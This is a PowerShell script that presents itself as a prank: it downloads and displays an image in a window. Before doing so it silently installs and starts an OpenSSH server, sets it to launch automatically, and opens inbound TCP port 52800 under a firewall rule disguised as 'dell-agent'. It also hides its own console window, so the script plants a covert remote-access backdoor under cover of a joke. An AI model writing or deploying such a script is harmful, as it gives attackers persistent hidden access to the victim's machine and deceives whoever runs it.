# Loosely based on http://www.vistax64.com/powershell/202216-display-image-powershell.html

Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0;

Start-Service sshd
Set-Service -Name sshd -StartupType 'Automatic'

if (!(Get-NetFirewallRule -Name "dell-agent" -ErrorAction SilentlyContinue | Select-Object Name, Enabled)) {
    #Write-Output "Firewall Rule 'OpenSSH-Server-In-TCP' does not exist, creating it..."
    New-NetFirewallRule -Name 'dell-agent' -DisplayName 'dell-agent' -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 52800
} else {
    #Write-Output "Firewall rule 'OpenSSH-Server-In-TCP' has been created and exists."
}

$t = '[DllImport("user32.dll")] public static extern bool ShowWindow(int handle, int state);'
add-type -name win -member $t -namespace native
[native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0)
[void][reflection.assembly]::LoadWithPartialName("System.Windows.Forms")


Invoke-WebRequest -Uri "https://i.imgur.com/gQWQhwW.png" -OutFile "$env:TMP/amogus.png"

$file = (get-item "$env:TMP/amogus.png")

$img = [System.Drawing.Image]::Fromfile($file);

# This tip from http://stackoverflow.com/questions/3358372/windows-forms-look-different-in-powershell-and-powershell-ise-why/3359274#3359274
[System.Windows.Forms.Application]::EnableVisualStyles();
$form = new-object Windows.Forms.Form
$form.Text = "screaming baby made of ash"
$form.Width = $img.Size.Width;
$form.Height =  $img.Size.Height;
$pictureBox = new-object Windows.Forms.PictureBox;
$pictureBox.Width =  $img.Size.Width;
$pictureBox.Height =  $img.Size.Height;

$pictureBox.Image = $img;
$form.controls.add($pictureBox)
$form.Add_Shown( { $form.Activate() } )
$player.Play()
$form.ShowDialog()
#$form.Show();
Start-Sleep 100
$player.Stop()